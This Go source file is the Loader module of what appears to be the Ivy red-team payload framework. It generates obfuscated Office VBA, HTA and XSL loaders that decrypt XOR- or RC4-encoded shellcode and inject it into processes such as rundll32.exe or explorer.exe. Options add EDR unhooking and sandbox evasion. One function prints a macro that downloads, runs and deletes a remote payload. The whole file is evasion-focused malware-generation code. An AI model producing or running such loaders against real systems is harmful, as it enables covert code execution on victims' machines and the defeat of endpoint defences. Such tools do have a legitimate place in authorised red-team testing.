package Loader

import (
	"bytes"
	"fmt"
	"log"
	"strings"
	"text/template"

	"github.com/optiv/Ivy/Cryptor"
	"github.com/optiv/Ivy/Struct"
	"github.com/optiv/Ivy/Utils"
)

type Holder struct {
	VBAkey    string
	Variables map[string]string
}

type JavaCode struct {
	objExcel            string
	WshShell            string
	Application_Version string
	strRegPath          string
	objWorkbook         string
	shellcode           string
	xlmodule            string
	Variables           map[string]string
}

type VBADECODE struct {
	hexDecodeFunction string
	hexInput          string
	hexI              string
	xorFunction       string
	xorKey            string
	xorA              string
	xorText           string
	xorI              string
	shellcode         string
	val               string
	Variables         map[string]string
}

type Code1 struct {
	EncodedPayload string
	myArray        string
	myByte         string
	pInfo          string
	sNull          string
	sProc          string
	rwxpage        string
	offset         string
	res            string
	CreateStuff    string
	AllocStuff     string
	WriteStuff     string
	RunStuff       string
	Variables      map[string]string
}

type Code2 struct {
	EncodedPayload      string
	shellcode           string
	rawshellCode        string
	shellLength         string
	shellcode1          string
	memoryAddress       string
	ByteArray           string
	zL                  string
	rL                  string
	Value               string
	pos                 string
	executeResult       string
	splitrawshellcode32 string
	splitrawshellcode64 string
	allocateMemory      string
	copyMemory          string
	shellExecute        string
	Variables           map[string]string
}

type EndCode struct {
	objExcel    string
	WshShell    string
	strRegPath  string
	objWorkbook string
	xlmodule    string
	shellcode   string
	Auto_Open   string
	Variables   map[string]string
}

type DecodeStarter struct {
	xorFunction       string
	hexDecodeFunction string
	EncodedPayload    string
	VBAKey            string
	shellcode         string
	Auto_Open         string
	Variables         map[string]string
}

type sct struct {
	progid    string
	classid   string
	payload   string
	Variables map[string]string
}

type xsl struct {
	payload   string
	Variables map[string]string
}
type HTA struct {
	payload   string
	Variables map[string]string
}

type stagless_decryption struct {
	b64payload string
	b64key     string
	shellcode  string
	Variables  map[string]string
}

type macro struct {
	HTTPReq    string
	t          string
	remoteFile string
	storeIn    string
	pathOfFile string
	obj        string
	Full       string
	sleep      string
	Variables  map[string]string
}

type sandbox struct {
	domain    string
	proc      string
	WSHShell  string
	objShell  string
	Variables map[string]string
}

var buffer bytes.Buffer

//First
func Java_Code_Buff(product string) (string, string, string, string, string, string, string, string) {

	javacode := &JavaCode{}
	javacode.Variables = make(map[string]string)
	var struct_option string
	//Java code variables//
	javacode.Variables["objOffice"] = Cryptor.VarNumberLength(4, 9)
	// javacode.Variables["objWord"] = Cryptor.VarNumberLength(4, 9)
	// javacode.Variables["objPP"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["WshShell"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["Application_Version"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["strRegPath"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["objWorkbook"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["xlmodule"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["EncodedPayload"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["DecodedValue"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["shellcode"] = Cryptor.VarNumberLength(4, 9)
	javacode.Variables["Auto_Open"] = Cryptor.VarNumberLength(4, 9)

	//Creating Code Snippets//
	if product == "Excel" {
		struct_option = Struct.Javacode_Start_Excel()
	}
	if product == "Word" {
		struct_option = Struct.Javacode_Start_Word()
	}
	if product == "PowerPoint" {
		struct_option = Struct.Javacode_Start_PowerPoint()
	}
	javaTemplate, err := template.New("javacode").Parse(struct_option)
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := javaTemplate.Execute(&buffer, javacode); err != nil {
		log.Fatal(err)
	}
	first := buffer.String()
	return first, javacode.Variables["EncodedPayload"], javacode.Variables["DecodedValue"], javacode.Variables["shellcode"], javacode.Variables["Auto_Open"], javacode.Variables["objWorkbook"], javacode.Variables["objOffice"], javacode.Variables["xlmodule"]

}

//pre-Second
func Code1_Buff(shellcode string, stageless bool, EncodedPayload string, DecodedValue string, rrawpayload32 string, rrawpayload64 string, VBAkey string, Auto_Open string, debugging bool, unhook bool, process32 string, process64 string) (string, string) {
	code1 := &Code1{}
	code1.Variables = make(map[string]string)
	var shellcodebuff string
	var Structvalue string
	//code1 variables//
	code1.Variables["shellcode"] = shellcode
	code1.Variables["EncodedPayload"] = EncodedPayload
	code1.Variables["VBACode32"] = Cryptor.VbaCodePayload(rrawpayload32, code1.Variables["EncodedPayload"], stageless, code1.Variables["shellcode"])
	code1.Variables["VBACode64"] = Cryptor.VbaCodePayload(rrawpayload64, code1.Variables["EncodedPayload"], stageless, code1.Variables["shellcode"])
	code1.Variables["myArray"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["myByte"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["pInfo"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["sInfo"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["sNull"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["sProc"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["rwxpage"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["DecodedValue"] = DecodedValue
	code1.Variables["Function"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["offset"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["res"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["CreateStuff"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["AllocStuff"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["WriteStuff"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["RunStuff"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["val"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["Auto_Open"] = Auto_Open

	code1.Variables["GetProcAddress"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["GetModuleHandleA"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["shellExecute"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["LLib"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["dll"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["patch"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["dataaddr"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["Prep"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["boolresult"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["bytecode"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["pprocaddress"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["EDRByteArray"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["proc"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["buff"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["addrarry"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["patcharray"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["dllname"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["Unhook"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["edrpos"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["edrzL"] = Cryptor.VarNumberLength(4, 9)
	code1.Variables["Value1"] = Cryptor.VarNumberLength(4, 9)

	if process32 == "" {
		code1.Variables["process32"] = "rundll32.exe"
	} else {
		code1.Variables["process32"] = process32
	}
	if process64 == "" {
		code1.Variables["process64"] = `Environ("windir") & "\\explorer.exe"`
	} else {
		code1.Variables["process64"] = process64
	}

	if stageless == false {
		buffer.Reset()
		code1Template, err := template.New("code1").Parse(Struct.Process_Inject())
		if err != nil {
			log.Fatal(err)
		}

		if err := code1Template.Execute(&buffer, code1); err != nil {
			log.Fatal(err)
		}
		if debugging {
			Utils.Writefile("Debug", buffer.String())
		}
		shellcodebuff = Cryptor.Encrypt(buffer.String(), VBAkey, code1.Variables["shellcode"], code1.Variables["EncodedPayload"])
	} else if stageless == true {
		buffer.Reset()
		if unhook == true {
			Structvalue = Struct.Unhook_Stageless_Process_Inject()
		} else {
			Structvalue = Struct.Stageless_Process_Inject()
		}

		code1Template, err := template.New("code1").Parse(Structvalue)
		if err != nil {
			log.Fatal(err)
		}

		if err := code1Template.Execute(&buffer, code1); err != nil {
			log.Fatal(err)
		}
		if debugging {
			Utils.Writefile("Debug", buffer.String())
		}
		shellcodebuff = (buffer.String())

	}
	return shellcodebuff, code1.Variables["Function"]
}

//pre-Second
func Code2_Buff(shellcode string, stageless bool, EncodedPayload string, DecodedValue string, rrawpayload32 string, rrawpayload64 string, VBAkey string, Auto_Open string, debugging bool, unhook bool) (string, string) {

	code2 := &Code2{}
	code2.Variables = make(map[string]string)
	var shellcodebuff string
	var Structvalue string
	//code2 variables//
	code2.Variables["EncodedPayload"] = EncodedPayload
	code2.Variables["shellcode"] = shellcode
	code2.Variables["shellLength"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["memoryAddress"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["ByteArray"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["zL"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["rL"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["Value"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["pos"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["excuteResult"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["splitrawshellcode64"] = Cryptor.ShellCodePayload(rrawpayload64, code2.Variables["EncodedPayload"], stageless, code2.Variables["shellcode"])
	code2.Variables["splitrawshellcode32"] = Cryptor.ShellCodePayload(rrawpayload32, code2.Variables["EncodedPayload"], stageless, code2.Variables["shellcode"])
	code2.Variables["DecodedValue"] = DecodedValue
	code2.Variables["rawshellCode"] = code2.Variables["EncodedPayload"]
	code2.Variables["Function"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["allocateMemory"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["copyMemory"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["shellExecute"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["Auto_Open"] = Auto_Open

	code2.Variables["GetProcAddress"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["GetModuleHandleA"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["shellExecute"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["LLib"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["dll"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["patch"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["dataaddr"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["Prep"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["boolresult"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["bytecode"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["pprocaddress"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["EDRByteArray"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["proc"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["buff"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["addrarry"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["patcharray"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["dllname"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["Unhook"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["edrpos"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["edrzL"] = Cryptor.VarNumberLength(4, 9)
	code2.Variables["Value1"] = Cryptor.VarNumberLength(4, 9)

	if stageless == true {
		buffer.Reset()

		if unhook == true {
			Structvalue = Struct.Unhooked_Stageless_Local_Spawn()
		} else {
			Structvalue = Struct.Stageless_Local_Spawn()
		}
		code1Template, err := template.New("code2").Parse(Structvalue)
		if err != nil {
			log.Fatal(err)
		}

		if err := code1Template.Execute(&buffer, code2); err != nil {
			log.Fatal(err)
		}
		if debugging {
			Utils.Writefile("Debug", buffer.String())
		}
		shellcodebuff = (buffer.String())
		buffer.Reset()
	} else if stageless == false {
		buffer.Reset()
		code1Template, err := template.New("code2").Parse(Struct.Thread_Spawn())
		if err != nil {
			log.Fatal(err)
		}

		if err := code1Template.Execute(&buffer, code2); err != nil {
			log.Fatal(err)
		}
		if debugging {
			Utils.Writefile("Debug", buffer.String())
		}
		shellcodebuff = Cryptor.Encrypt(buffer.String(), VBAkey, code2.Variables["shellcode"], code2.Variables["EncodedPayload"])
	}
	return shellcodebuff, code2.Variables["Function"]
}

//Second
func Stagless_Decryption_Buff(shellcode string, shellcodebuff string) string {
	stagless_decryption := &stagless_decryption{}
	stagless_decryption.Variables = make(map[string]string)
	stagless_decryption.Variables["shellcode"] = shellcode
	stagless_decryption.Variables["rc4"] = Cryptor.VarNumberLength(4, 9)
	stagless_decryption.Variables["decodeBase64"] = Cryptor.VarNumberLength(4, 9)
	stagless_decryption.Variables["b4decoded"] = Cryptor.VarNumberLength(4, 9)
	stagless_decryption.Variables["b4decodedkey"] = Cryptor.VarNumberLength(4, 9)
	stagless_decryption.Variables["rc4key"] = Cryptor.VarNumberLength(4, 9)
	stagless_decryption.Variables["rc4str"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()
	b64payload, b64key := Cryptor.Rc4_encryptor(shellcodebuff)
	stagless_decryption.Variables["b64payload"] = b64payload
	stagless_decryption.Variables["b64key"] = b64key
	RC4Template, err := template.New("stagless_decryption").Parse(Struct.Stagless_Decryption())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := RC4Template.Execute(&buffer, stagless_decryption); err != nil {
		log.Fatal(err)
	}
	second := buffer.String()
	return second

}

//Third
func Decoder_Start_Buff(shellcode string, EncodedPayload string, DecodedValue string, Auto_Open string, Function string, stageless bool) (string, string, string) {
	decodestarter := &DecodeStarter{}
	decodestarter.Variables = make(map[string]string)

	//DecoderStart variables//
	decodestarter.Variables["shellcode"] = shellcode
	decodestarter.Variables["xorFunction"] = Cryptor.VarNumberLength(4, 9)
	decodestarter.Variables["hexDecodeFunction"] = Cryptor.VarNumberLength(4, 9)
	decodestarter.Variables["EncodedPayload"] = EncodedPayload
	decodestarter.Variables["DecodedValue"] = DecodedValue
	decodestarter.Variables["Auto_Open"] = Auto_Open
	decodestarter.Variables["Function"] = Function
	buffer.Reset()
	if stageless == true {
	} else if stageless == false {
		buffer.Reset()
		decodestarterTemplate, err := template.New("decodestarter").Parse(Struct.Decode_Starter())
		if err != nil {
			log.Fatal(err)
		}
		buffer.Reset()
		if err := decodestarterTemplate.Execute(&buffer, decodestarter); err != nil {
			log.Fatal(err)
		}
	}
	third := buffer.String()
	return third, decodestarter.Variables["xorFunction"], decodestarter.Variables["hexDecodeFunction"]

}

//fourth
func VBA_Decode_Buff(VBAkey string, shellcode string, hexDecodeFunction string, xorFunction string, DecodedValue string, Function string, stageless bool) string {
	vbadecode := &VBADECODE{}
	vbadecode.Variables = make(map[string]string)
	//VBA Decode//
	vbadecode.Variables["VBAKey"] = VBAkey
	vbadecode.Variables["shellcode"] = shellcode
	vbadecode.Variables["hexDecodeFunction"] = hexDecodeFunction
	vbadecode.Variables["hexInput"] = Cryptor.VarNumberLength(4, 9)
	vbadecode.Variables["hexI"] = Cryptor.VarNumberLength(4, 9)
	//
	vbadecode.Variables["xorFunction"] = xorFunction
	vbadecode.Variables["xorKey"] = Cryptor.VarNumberLength(4, 9)
	vbadecode.Variables["xorA"] = Cryptor.VarNumberLength(4, 9)
	vbadecode.Variables["xorText"] = Cryptor.VarNumberLength(4, 9)
	vbadecode.Variables["xorI"] = Cryptor.VarNumberLength(4, 9)
	vbadecode.Variables["DecodedValue"] = DecodedValue
	vbadecode.Variables["Function"] = Function
	if stageless == false {
		buffer.Reset()
		vbadecodeTemplate, err := template.New("vbadecode").Parse(Struct.VBA_Decode())
		if err != nil {
			log.Fatal(err)

		}
		buffer.Reset()
		if err := vbadecodeTemplate.Execute(&buffer, vbadecode); err != nil {
			log.Fatal(err)
		}
	} else {
		buffer.Reset()
	}
	fourth := buffer.String()
	return fourth
}

//Fifth
func End_Code_Buff(objWorkbook string, objExcel string, xlmodule string, shellcode string, Auto_Open string) string {
	endcode := &EndCode{}
	endcode.Variables = make(map[string]string)
	//EndCode variables//
	endcode.Variables["objWorkbook"] = objWorkbook
	endcode.Variables["objOffice"] = objExcel
	endcode.Variables["xlmodule"] = xlmodule
	endcode.Variables["shellcode"] = shellcode
	endcode.Variables["Auto_Open"] = Auto_Open
	buffer.Reset()
	endcodeTemplate, err := template.New("endcode").Parse(Struct.End_Code())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := endcodeTemplate.Execute(&buffer, endcode); err != nil {
		log.Fatal(err)
	}
	fifth := buffer.String()
	return fifth

}

func XSL_Code_Buff(compiled string) string {
	xsl := &xsl{}
	xsl.Variables = make(map[string]string)
	xsl.Variables["payload"] = compiled
	buffer.Reset()
	xslTemplate, err := template.New("xsl").Parse(Struct.HTA_Loader())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := xslTemplate.Execute(&buffer, xsl); err != nil {
		log.Fatal(err)
	}
	compiled = buffer.String()
	return compiled

}

func HTA_Code_Buff(compiled string) string {
	hta := &HTA{}
	hta.Variables = make(map[string]string)
	hta.Variables["payload"] = compiled
	buffer.Reset()
	htaTemplate, err := template.New("hta").Parse(Struct.HTA_Loader())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := htaTemplate.Execute(&buffer, hta); err != nil {
		log.Fatal(err)
	}
	compiled = buffer.String()
	return compiled
}

func Macro_Code_Buff(URL string, outFile string) {
	macro := &macro{}
	macro.Variables = make(map[string]string)
	//Macro variables//
	macro.Variables["HTTPReq"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["t"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["remoteFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["pathOfFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["obj"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["Full"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["output"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["storeIn"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)

	if strings.HasSuffix(URL, "/") {
	} else {
		URL = URL + "/"
	}
	macro.Variables["outFile"] = outFile
	macro.Variables["URL"] = URL
	fmt.Println("[*] Macro delivery payload")
	fmt.Println("[*] Office macro that will download, execute and remove the payload:")
	buffer.Reset()
	macroTemplate, err := template.New("macro").Parse(Struct.Macro())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := macroTemplate.Execute(&buffer, macro); err != nil {
		log.Fatal(err)
	}
	fmt.Println(buffer.String())
}

func Sandbox_Code_Buff() string {
	sandbox := &sandbox{}
	sandbox.Variables = make(map[string]string)
	//Sandbox variables//
	sandbox.Variables["domain"] = Cryptor.VarNumberLength(4, 9)
	sandbox.Variables["proc"] = Cryptor.VarNumberLength(4, 9)
	sandbox.Variables["WSHShell"] = Cryptor.VarNumberLength(4, 9)
	sandbox.Variables["objShell"] = Cryptor.VarNumberLength(4, 9)
	buffer.Reset()
	sandboxTemplate, err := template.New("sandbox").Parse(Struct.Sandbox())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := sandboxTemplate.Execute(&buffer, sandbox); err != nil {
		log.Fatal(err)
	}
	sandboxbuff := buffer.String()
	return sandboxbuff
}

func Varibles(stageless bool, payloadtype string, outFile string, URL string, CommandLoader string, sandbox bool, debugging bool, unhook bool, rrawpayload64 string, rrawpayload32 string, process32 string, process64 string, product string) {
	var compiled string
	var DecodedValue string
	var EncodedPayload string
	var Function string
	var shellcodebuff string
	holder := &Holder{}
	holder.Variables = make(map[string]string)
	holder.VBAkey = Cryptor.VarNumberLength(19, 25)
	fmt.Println("[*] Generating Implant")
	first, EncodedPayload, DecodedValue, shellcode, Auto_Open, objWorkbook, objExcel, xlmodule := Java_Code_Buff(product)
	Utils.PrintDebug(debugging, "JAVA CODE SNIPPET COMPLETED\n")
	if stageless == true {
		fmt.Println("[!] Stageless Shellcode Selected")
	} else {
		fmt.Println("[!] Staged Shellcode Selected")
	}
	if unhook == true {
		fmt.Println("[!] Unhook Usermode EDR Mode Selected")
	} else {
	}
	if payloadtype == "Inject" {
		fmt.Println("[*] Injection Mode Selected")
		if unhook == true {
			fmt.Println("[!] Warning: Currently Ivy will only unhook the parent process, not the injected process")
		}
		shellcodebuff, Function = Code1_Buff(shellcode, stageless, EncodedPayload, DecodedValue, rrawpayload32, rrawpayload64, holder.VBAkey, Auto_Open, debugging, unhook, process32, process64)
		Utils.PrintDebug(debugging, "PROCESS INJECTION CODE SNIPPET COMPLETED\n")
	} else if payloadtype == "Local" {
		fmt.Println("[*] Local Mode Selected")
		shellcodebuff, Function = Code2_Buff(shellcode, stageless, EncodedPayload, DecodedValue, rrawpayload32, rrawpayload64, holder.VBAkey, Auto_Open, debugging, unhook)
		Utils.PrintDebug(debugging, "LOCAL SPAWNING CODE SNIPPET COMPLETED\n")
	}
	second := Stagless_Decryption_Buff(shellcode, shellcodebuff)
	fmt.Println("[*] Implant Encrypted")
	fmt.Println("[*] Generating Loader")
	third, xorFunction, hexDecodeFunction := Decoder_Start_Buff(shellcode, EncodedPayload, DecodedValue, Auto_Open, Function, stageless)
	Utils.PrintDebug(debugging, "DECODER STARTER  SNIPPET COMPLETED\n")
	fourth := VBA_Decode_Buff(holder.VBAkey, shellcode, DecodedValue, Function, xorFunction, hexDecodeFunction, stageless)
	Utils.PrintDebug(debugging, "DECODER FUNCTION SNIPPET COMPLETED\n")
	fifth := End_Code_Buff(objWorkbook, objExcel, xlmodule, shellcode, Auto_Open)
	Utils.PrintDebug(debugging, "LAUCHER SNIPPET COMPLETED\n")
	if sandbox == true {
		sanboxbuff := Sandbox_Code_Buff()
		compiled = sanboxbuff + first + second + third + fourth + fifth
		Utils.PrintDebug(debugging, "SANDBOX SNIPPET COMPLETED\n")
	} else if sandbox == false {
		compiled = first + second + third + fourth + fifth
	}
	if CommandLoader == "hta" {
		compiled = HTA_Code_Buff(compiled)
		Utils.PrintDebug(debugging, "HTA SNIPPET COMPLETED\n")
	}
	if CommandLoader == "xsl" {
		compiled = XSL_Code_Buff(compiled)
		Utils.PrintDebug(debugging, "XSL SNIPPET COMPLETED\n")
	}
	Utils.Writefile(outFile, compiled)
	if CommandLoader == "macro" {
		Macro_Code_Buff(URL, outFile)
	}
}
